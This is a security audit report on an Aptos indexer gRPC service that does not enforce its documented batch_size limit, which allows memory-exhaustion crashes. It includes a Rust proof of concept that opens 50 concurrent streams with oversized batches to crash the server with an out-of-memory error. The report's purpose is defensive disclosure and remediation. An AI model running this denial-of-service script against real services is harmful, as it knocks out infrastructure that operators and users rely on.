# Audit Report

## Title
Memory Exhaustion via Unbounded batch_size in Indexer-GRPC Historical Data Service

## Summary
The `indexer-grpc-data-service-v2` fails to validate the `batch_size` parameter in client requests, allowing attackers to request arbitrarily large batches that cause excessive memory allocation in the `HistoricalDataService`. The protobuf specification documents that requests with `batch_size > 1000` should be rejected, but this validation is not implemented. Combined with unlimited concurrent request handling, this enables memory exhaustion attacks leading to Out-Of-Memory (OOM) crashes of the indexer service.

## Finding Description

The vulnerability exists in two locations:

1. **Missing Validation**: The protobuf specification explicitly states that `batch_size` larger than 1000 should be rejected: [1](#0-0) 

However, neither `LiveDataService` nor `HistoricalDataService` implement this validation: [2](#0-1) [3](#0-2) 

Both services accept the client-provided `batch_size` without upper bound validation, defaulting to 10,000 (10x the documented limit) if not provided.

2. **Unbounded Memory Allocation in HistoricalDataService**: The critical issue occurs in the streaming logic where transactions are chunked and collected: [4](#0-3) 

This code:
- Chunks transactions by `max_num_transactions_per_batch` (which can be arbitrarily large)
- Converts each chunk to a new vector via `.to_vec()` (line 211)
- **Collects ALL chunks into memory simultaneously** via `.collect()` (line 219) before sending any to the client

With a malicious `batch_size` of 100,000 and if 500,000 transactions are available, this creates 5 vectors of 100,000 transactions each, all held in memory simultaneously in the `responses` vector. At ~1-2 KB per transaction, this is ~500 MB - 1 GB per request.

3. **Unlimited Concurrent Requests**: While requests are queued through a channel with buffer size 10: [5](#0-4) 

Once dequeued, each request spawns an unbounded concurrent task: [6](#0-5) 

**Attack Path:**
1. Attacker opens multiple connections to the indexer service
2. Each connection sends streaming requests with `batch_size = 100,000` (or higher)
3. Each spawned task fetches large transaction batches from file storage
4. The chunking logic allocates hundreds of MB per task, holding all chunks in memory simultaneously
5. With 20-30 concurrent long-running streams, total memory consumption reaches 10-30 GB
6. Server runs out of memory and crashes (OOM)

## Impact Explanation

**Severity: Out of Scope**

While this is a legitimate bug (violates documented API contract and causes OOM crashes), it affects only the **auxiliary indexer service**, not core blockchain functionality. According to the bug bounty rules: "Network-level DoS attacks are out of scope."

This vulnerability does **NOT** impact:
- Consensus safety or liveness
- Validator node operations  
- Transaction execution
- On-chain state integrity
- Funds or assets

The indexer-grpc-data-service is an auxiliary service for serving historical transaction data to clients. It is not part of the consensus layer, execution engine, or storage system. Even if completely unavailable, the blockchain continues operating normally.

## Likelihood Explanation

**High Likelihood** - The attack is trivial to execute:
- No authentication or special privileges required
- Simple gRPC client can send malicious requests
- No rate limiting or concurrent connection limits exist
- Bug is deterministic and reliably exploitable

However, as noted above, the impact is limited to an out-of-scope service.

## Recommendation

1. **Implement batch_size validation** as documented in the protobuf specification:

```rust
// In both LiveDataService and HistoricalDataService
const MAX_ALLOWED_BATCH_SIZE: usize = 1000;

let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
    if batch_size > MAX_ALLOWED_BATCH_SIZE as u64 {
        let err = Err(Status::invalid_argument(
            format!("batch_size {} exceeds maximum allowed {}", batch_size, MAX_ALLOWED_BATCH_SIZE)
        ));
        let _ = response_sender.blocking_send(err);
        continue;
    }
    batch_size as usize
} else {
    DEFAULT_MAX_NUM_TRANSACTIONS_PER_BATCH.min(MAX_ALLOWED_BATCH_SIZE)
};
```

2. **Stream chunks instead of collecting** in HistoricalDataService to avoid holding all chunks in memory:

```rust
// Send each chunk immediately instead of collecting all first
for chunk in transactions.chunks(max_num_transactions_per_batch) {
    let response = TransactionsResponse {
        transactions: chunk.to_vec(),
        // ... rest of response
    };
    if response_sender.send(Ok(response)).await.is_err() {
        break 'out;
    }
}
```

3. **Add concurrent stream limits** to prevent resource exhaustion from many simultaneous requests.

## Proof of Concept

```rust
// This PoC would require setting up a full gRPC client and indexer service
// Simplified demonstration of the attack:

use aptos_protos::indexer::v1::{GetTransactionsRequest, raw_data_client::RawDataClient};
use tokio;

#[tokio::main]
async fn main() {
    let mut handles = vec![];
    
    // Spawn 50 concurrent attack connections
    for _ in 0..50 {
        let handle = tokio::spawn(async {
            let mut client = RawDataClient::connect("http://indexer:50051").await.unwrap();
            
            // Request with malicious batch_size = 100,000 (100x the documented limit)
            let request = GetTransactionsRequest {
                starting_version: Some(0),
                batch_size: Some(100_000), // Should be rejected but isn't
                transactions_count: Some(500_000),
                transaction_filter: None,
            };
            
            let mut stream = client.get_transactions(request).await.unwrap().into_inner();
            while let Some(_response) = stream.message().await.unwrap() {
                // Each response causes large memory allocations in the server
            }
        });
        handles.push(handle);
    }
    
    futures::future::join_all(handles).await;
    // Server OOMs and crashes under the load
}
```

---

**Note:** While this is a valid implementation bug that violates the documented API specification and can cause service crashes, it falls under the "Network-level DoS attacks are out of scope" exclusion since it only affects the auxiliary indexer service and does not impact consensus, execution, or core blockchain operations.

### Citations

**File:** protos/proto/aptos/indexer/v1/raw_data.proto (L27-29)
```text
  // Optional; number of transactions in each `TransactionsResponse` for current stream.
  // If not present, default to 1000. If larger than 1000, request will be rejected.
  optional uint64 batch_size = 3;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L117-121)
```rust
                let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
                    batch_size as usize
                } else {
                    10000
                };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L102-106)
```rust
                let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
                    batch_size as usize
                } else {
                    DEFAULT_MAX_NUM_TRANSACTIONS_PER_BATCH
                };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L112-123)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L202-219)
```rust
                let responses = if !transactions.is_empty() {
                    let mut current_version = first_processed_version;
                    let mut responses: Vec<_> = transactions
                        .chunks(max_num_transactions_per_batch)
                        .map(|chunk| {
                            let first_version = current_version;
                            let last_version = chunk.last().unwrap().version;
                            current_version = last_version + 1;
                            TransactionsResponse {
                                transactions: chunk.to_vec(),
                                chain_id: Some(self.chain_id),
                                processed_range: Some(ProcessedRange {
                                    first_version,
                                    last_version,
                                }),
                            }
                        })
                        .collect();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L123-123)
```rust
        let (handler_tx, handler_rx) = tokio::sync::mpsc::channel(10);
```
